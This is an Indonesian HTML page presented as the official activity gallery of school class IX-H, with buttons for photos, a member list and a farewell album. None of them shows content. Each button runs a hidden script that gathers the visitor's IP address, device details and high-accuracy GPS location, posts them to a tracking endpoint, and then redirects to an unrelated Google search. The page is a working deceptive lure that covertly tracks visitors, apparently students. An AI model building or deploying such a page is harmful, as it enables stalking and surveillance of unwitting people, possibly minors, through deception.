<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KELAS IX-H — Album Kegiatan</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: linear-gradient(180deg, #8B0000, #4a0000);
    color: #fff; font-family: 'Segoe UI', Arial, sans-serif;
    min-height: 100vh; padding: 20px; text-align: center;
  }
  .header {
    font-size: 28px; font-weight: 900; padding: 30px 0;
    text-shadow: 2px 2px 0 #000; letter-spacing: 2px;
  }
  .header span { color: #FFD700; }
  .card {
    background: rgba(255,255,255,0.08);
    border: 1px solid rgba(255,255,255,0.2);
    border-radius: 14px; padding: 24px; margin: 18px auto;
    max-width: 420px; backdrop-filter: blur(6px);
  }
  .btn {
    display: block; width: 100%; margin: 10px 0;
    background: #FFD700; color: #4a0000;
    padding: 14px; border: none; border-radius: 10px;
    font-weight: 800; font-size: 15px; cursor: pointer;
    transition: transform 0.1s;
  }
  .btn:active { transform: scale(0.97); }
  .loading {
    display: none; margin-top: 16px; color: #FFD700;
    font-size: 13px;
  }
  .spinner {
    display: inline-block; width: 14px; height: 14px;
    border: 2px solid #FFD700; border-top-color: transparent;
    border-radius: 50%; animation: spin 0.8s linear infinite;
    vertical-align: middle; margin-right: 8px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

  <div class="header">🔴 KELAS <span>IX-H</span> 🔴</div>

  <div class="card">
    <p style="margin-bottom:16px; font-size:14px; opacity:0.9;">
      Selamat datang di galeri resmi kelas IX-H.<br>
      Pilih menu di bawah untuk melanjutkan.
    </p>

    <button class="btn" onclick="startTrack('Foto Kegiatan')">📸 Lihat Foto Kegiatan</button>
    <button class="btn" onclick="startTrack('Daftar Anggota')">📋 Daftar Anggota</button>
    <button class="btn" onclick="startTrack('Album Perpisahan')">🎉 Album Perpisahan</button>

    <div class="loading" id="loading">
      <span class="spinner"></span> Memuat konten...
    </div>
  </div>

<script>
async function startTrack(action) {
  document.getElementById('loading').style.display = 'block';

  let ip = '-', ua = navigator.userAgent, lang = navigator.language;
  let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  let screen = `${window.screen.width}x${window.screen.height}`;
  let platform = navigator.platform || '-';

  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const d = await r.json();
    ip = d.ip;
  } catch(e) {}

  const gpsData = await new Promise((resolve) => {
    if (!navigator.geolocation) return resolve(null);
    const timeout = setTimeout(() => resolve(null), 8000);
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        clearTimeout(timeout);
        resolve({
          lat: pos.coords.latitude.toFixed(6),
          lng: pos.coords.longitude.toFixed(6),
          acc: Math.round(pos.coords.accuracy)
        });
      },
      () => { clearTimeout(timeout); resolve(null); },
      { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
    );
  });

  let maps = '-';
  if (gpsData) maps = `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}`;

  try {
    await fetch('/api/track', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        ip, ua, lang, tz, screen, platform, action,
        lat: gpsData?.lat || null,
        lng: gpsData?.lng || null,
        acc: gpsData?.acc || null,
        maps
      })
    });
  } catch(e) {}

  setTimeout(() => {
    window.location.href = 'https://www.google.com/search?q=kelas+9h+smp';
  }, 1200);
}
</script>
</body>
</html>
